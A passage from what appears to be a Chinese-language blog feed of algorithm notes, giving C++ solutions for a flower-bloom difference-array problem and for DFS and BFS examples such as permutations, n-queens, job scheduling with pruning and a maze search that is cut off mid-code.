&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>超时原因，离散化后进行差分时 r+1的度量是不一样的，所以要对r+1也进行离散化。<br>因此代码改为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> a[<span class="hljs-number">300005</span>];<br>    vector&lt;<span class="hljs-type">int</span>&gt;alls;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-type">int</span> l =<span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> r= alls.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">while</span>(l&lt;r)<br>        &#123;<br>            <span class="hljs-type">int</span> mid =(l+r)&gt;&gt;<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(alls[mid]&gt;=x) r =mid;<br>            <span class="hljs-keyword">else</span> l =mid+<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> l;<br>    &#125;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">fullBloomFlowers</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; flowers, vector&lt;<span class="hljs-type">int</span>&gt;&amp; persons)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n=persons.<span class="hljs-built_in">size</span>();<br>        vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;add;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;flowers.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-type">int</span> l  =flowers[i][<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> r =flowers[i][<span class="hljs-number">1</span>];<br>            add.<span class="hljs-built_in">push_back</span>(&#123;l,r&#125;);<br>            alls.<span class="hljs-built_in">push_back</span>(l);<br>            alls.<span class="hljs-built_in">push_back</span>(r);<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            alls.<span class="hljs-built_in">push_back</span>(persons[i]);<br>        &#125;<br><br>        <span class="hljs-built_in">sort</span>(alls.<span class="hljs-built_in">begin</span>(),alls.<span class="hljs-built_in">end</span>());<br>        alls.<span class="hljs-built_in">erase</span>(<span class="hljs-built_in">unique</span>(alls.<span class="hljs-built_in">begin</span>(),alls.<span class="hljs-built_in">end</span>()),alls.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;p:add)<br>        &#123;<br>            <span class="hljs-type">int</span> l = <span class="hljs-built_in">find</span>(p.first);<br>            <span class="hljs-type">int</span> r = <span class="hljs-built_in">find</span>(p.second+<span class="hljs-number">1</span>);<br>            a[l]+=<span class="hljs-number">1</span>;<br>            a[r]-=<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;alls.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            a[i]+=a[i<span class="hljs-number">-1</span>];<br>        &#125;<br>        <span class="hljs-comment">//cout&lt;&lt;a[0]&lt;&lt;&quot; &quot;;</span><br>        <span class="hljs-comment">// for(int i=1;i&lt;alls.size();i++)</span><br>        <span class="hljs-comment">// &#123;</span><br>        <span class="hljs-comment">//     cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;;</span><br>        <span class="hljs-comment">// &#125;</span><br>        vector&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">ans</span>(n);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            ans[i] = a[<span class="hljs-built_in">find</span>(persons[i])];<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>顺利通过</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>深度优先搜索和广度优先搜索</title>
    <link href="/2020/03/29/DFSBFS/"/>
    <url>/2020/03/29/DFSBFS/</url>
    
    <content type="html"><![CDATA[<p>深度优先搜索和广度优先搜索。</p><h3 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h3><p>以输出排列数为例，主要进行状态的转移。</p><h4 id="输出排列数https-www-acwing-com-activity-content-problem-content-905"><a href="#输出排列数https-www-acwing-com-activity-content-problem-content-905" class="headerlink" title="输出排列数https://www.acwing.com/activity/content/problem/content/905/"></a>输出排列数<a href="https://www.acwing.com/activity/content/problem/content/905/">https://www.acwing.com/activity/content/problem/content/905/</a></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> path[N];<br>vector&lt;<span class="hljs-type">bool</span>&gt;<span class="hljs-built_in">vis</span>(N);<br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span><span class="hljs-comment">//n表示要搜索的位数。</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(u==n)<span class="hljs-comment">//搜索到了第n位</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)cout&lt;&lt;path[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<span class="hljs-comment">//对排列进行输出。</span><br>        cout&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<span class="hljs-comment">//对所有数进行遍历。</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(!vis[i])<span class="hljs-comment">//如果数没有被访问过，即数没有被用在排列中。</span><br>            &#123;<br>                path[u] = i;<span class="hljs-comment">//进行排列</span><br>                vis[i] = <span class="hljs-literal">true</span>;<span class="hljs-comment">//更新数的选择状态。</span><br>                <span class="hljs-built_in">dfs</span>(u+<span class="hljs-number">1</span>);<span class="hljs-comment">//对下一位进行搜索</span><br>                vis[i] = <span class="hljs-literal">false</span>;<span class="hljs-comment">//回溯之前的状态。</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>dfs也常用来进行暴力搜索，再数据量较小的情况下，对所有情况取值进行枚举进行搜索，通常根据题目情况配合回溯剪枝减小题目复杂度。<br>例题：<br><a href="https://leetcode.cn/problems/partition-to-k-equal-sum-subsets/">https://leetcode.cn/problems/partition-to-k-equal-sum-subsets/</a><br><a href="https://leetcode.cn/problems/find-minimum-time-to-finish-all-jobs/">https://leetcode.cn/problems/find-minimum-time-to-finish-all-jobs/</a><br><a href="https://leetcode.cn/problems/matchsticks-to-square/">https://leetcode.cn/problems/matchsticks-to-square/</a><br>该三道题的代码思路大致相同，都是均分后，暴搜看能否搜索到正好满足的情况。<br>常用剪枝。<br>在搜索前进行情况判断，若已经不满足则不再进行后续搜索。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span>(conditon) <span class="hljs-built_in">dfs</span>();<br></code></pre></td></tr></table></figure><p>若回溯后，该组为值为0,后续无论如何搜索也不能得到有意义的答案，直接返回，不进行后续搜索。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span>(sun[i]==<span class="hljs-number">0</span>)<span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt;sum;<br>    <span class="hljs-type">int</span> k;<br>    vector&lt;<span class="hljs-type">int</span>&gt;jobs;<br>    <span class="hljs-type">int</span> ans;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(idx==jobs.<span class="hljs-built_in">size</span>())<br>        &#123;<br>            <span class="hljs-type">int</span> mx =<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)<br>            &#123;<br>                mx =<span class="hljs-built_in">max</span>(mx,sum[i]);<br>            &#125;<br>            ans =<span class="hljs-built_in">min</span>(ans,mx);<br>            <span class="hljs-keyword">return</span> ;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)<br>        &#123;<br>            sum[i]+=jobs[idx];<br>            <span class="hljs-keyword">if</span>(sum[i]&lt;ans)<span class="hljs-comment">//剪枝</span><br>            &#123;<br>                <span class="hljs-built_in">dfs</span>(idx+<span class="hljs-number">1</span>);<br>            &#125;<br>            sum[i]-=jobs[idx];<br>            <span class="hljs-keyword">if</span>(sum[i]==<span class="hljs-number">0</span>)<span class="hljs-comment">//剪枝</span><br>            &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minimumTimeRequired</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; jobs, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">sum</span>(<span class="hljs-number">12</span>,<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">this</span>-&gt;sum = sum;<br>        <span class="hljs-keyword">this</span>-&gt;k = k;<br>        <span class="hljs-built_in">sort</span>(jobs.<span class="hljs-built_in">begin</span>(),jobs.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">this</span>-&gt;jobs =jobs;<br>        ans =<span class="hljs-number">1e9</span>;<br>        <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="n-皇后问题"><a href="#n-皇后问题" class="headerlink" title="n-皇后问题"></a>n-皇后问题</h4><p><a href="https://www.acwing.com/activity/content/problem/content/906/">https://www.acwing.com/activity/content/problem/content/906/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">20</span>;<br><span class="hljs-type">bool</span> col[N],dg[N],udg[N];<span class="hljs-comment">//分别标记列，对角和反对角线</span><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">char</span> g[N][N];<span class="hljs-comment">//存储图</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span><span class="hljs-comment">//函数按行进行枚举搜索。</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(u==n)<span class="hljs-comment">//如果搜索到第n行。</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<span class="hljs-comment">//输出可能的结果</span><br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>            &#123;<br>                cout&lt;&lt;g[i][j];<br>            &#125;<br>            cout&lt;&lt;endl;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-comment">//枚举第u行,第i列</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!col[i] &amp;&amp; !dg[u+i] &amp;&amp; !udg[n-u+i])<span class="hljs-comment">//如果该列，该对角线，该反对角线都没有皇后，则可以放入皇后</span><br>        &#123;<br>            g[u][i] = <span class="hljs-string">&#x27;Q&#x27;</span>;<span class="hljs-comment">//放入皇后</span><br>    <span class="hljs-comment">//更新状态</span><br>            col[i] =<span class="hljs-literal">true</span>;<br>            dg[u+i] = <span class="hljs-literal">true</span>;<br>            udg[n-u+i] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-built_in">dfs</span>(u+<span class="hljs-number">1</span>);<span class="hljs-comment">//对下一行进行搜索</span><br>    <span class="hljs-comment">//回溯</span><br>            col[i] =<span class="hljs-literal">false</span>;<br>            dg[u+i] = <span class="hljs-literal">false</span>;<br>            udg[n-u+i] = <span class="hljs-literal">false</span>;<br>            g[u][i]=<span class="hljs-string">&#x27;.&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>        &#123;<br>            g[i][j]=<span class="hljs-string">&#x27;.&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>);<br>    <br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>在搜索路径时，应注意剪纸枝来提算法效率，有时需要多次剪枝。<br>例：<a href="https://leetcode-cn.com/problems/check-if-there-is-a-valid-parentheses-string-path/">https://leetcode-cn.com/problems/check-if-there-is-a-valid-parentheses-string-path/</a><br>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> m,n,c;<span class="hljs-comment">//c表示当前括号状态，c&gt;=0均为合法状态</span><br>    <span class="hljs-type">bool</span> flag;<br>    <span class="hljs-type">bool</span> vis[<span class="hljs-number">101</span>][<span class="hljs-number">101</span>][<span class="hljs-number">201</span>];<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">dfs</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; grid,<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//cout&lt;&lt;x&lt;&lt;&quot; &quot;&lt;&lt;y&lt;&lt;endl;</span><br>        <span class="hljs-keyword">if</span> (c &gt; m - x + n - y - <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//当剩下的路径都不足以抵消c时，必然不成立，返回，剪枝</span><br>        <span class="hljs-keyword">if</span>(x==m<span class="hljs-number">-1</span> &amp;&amp; y==n<span class="hljs-number">-1</span> &amp;&amp; c==<span class="hljs-number">0</span>)<span class="hljs-comment">//搜索成功状态。</span><br>        &#123;<br>            flag =<span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(vis[x][y][c]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//由x,y,c确定的唯一状态已被搜索过，返回，剪枝</span><br>        vis[x][y][c]=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>((x+<span class="hljs-number">1</span>)&lt;m &amp;&amp; !flag)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(grid[x+<span class="hljs-number">1</span>][y]==<span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; !flag)<span class="hljs-comment">//若已有路径搜索到终点，返回，剪枝，下面分支皆是该策略。</span><br>            &#123;<br>                ++c;<br>                <span class="hljs-keyword">if</span>(c&gt;=<span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-built_in">dfs</span>(grid,x+<span class="hljs-number">1</span>,y);<br>                &#125;<br>                --c;<span class="hljs-comment">//回溯</span><br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(grid[x+<span class="hljs-number">1</span>][y]==<span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; !flag)<br>            &#123;<br>                --c;<br>                <span class="hljs-keyword">if</span>(c&gt;=<span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-built_in">dfs</span>(grid,x+<span class="hljs-number">1</span>,y);<br>                &#125;<br>                ++c;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>((y+<span class="hljs-number">1</span>)&lt;n &amp;&amp; !flag)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(grid[x][y+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; !flag)<br>            &#123;<br>                ++c;<br>                <span class="hljs-keyword">if</span>(c&gt;=<span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-built_in">dfs</span>(grid,x,y+<span class="hljs-number">1</span>);<br>                &#125;<br>                --c;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(grid[x][y+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; !flag)<br>            &#123;<br>                --c;<br>                <span class="hljs-keyword">if</span>(c&gt;=<span class="hljs-number">0</span> &amp;&amp; !flag)<br>                &#123;<br>                     <span class="hljs-built_in">dfs</span>(grid,x,y+<span class="hljs-number">1</span>);<br>                &#125;<br>                ++c;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasValidPath</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        flag =<span class="hljs-literal">false</span>;<br>        m=grid.<span class="hljs-built_in">size</span>();<br>        n=grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span>(grid[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;)&#x27;</span> || grid[m<span class="hljs-number">-1</span>][n<span class="hljs-number">-1</span>]==<span class="hljs-string">&#x27;(&#x27;</span> || (m+n)%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//剪枝，起始为&#x27;)&#x27;，终点为&#x27;(&#x27;。均不满足要求。</span><br>      <span class="hljs-comment">//此外，从左上角走到右下角，走过的长度为m+n-1,要求括号闭合，再次剪枝</span><br>        &#125;<br>        <span class="hljs-built_in">memset</span>(vis,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(vis));<br>        c=<span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">dfs</span>(grid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(flag)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h3><p>广度优先搜索一般都借助队列这一数据结构，有一些固定的模式。<br>走迷宫。<br><a href="https://www.acwing.com/activity/content/problem/content/907/">https://www.acwing.com/activity/content/problem/content/907/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">105</span>;<br><span class="hljs-type">int</span> a[N][N];<br><span class="hljs-type">int</span> dis[N][N];<span class="hljs-comment">//存储到起点的距离</span><br><span class="hljs-comment">//设置搜索方向</span><br><span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;<br><span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;m;j++)<br>        &#123;<br>            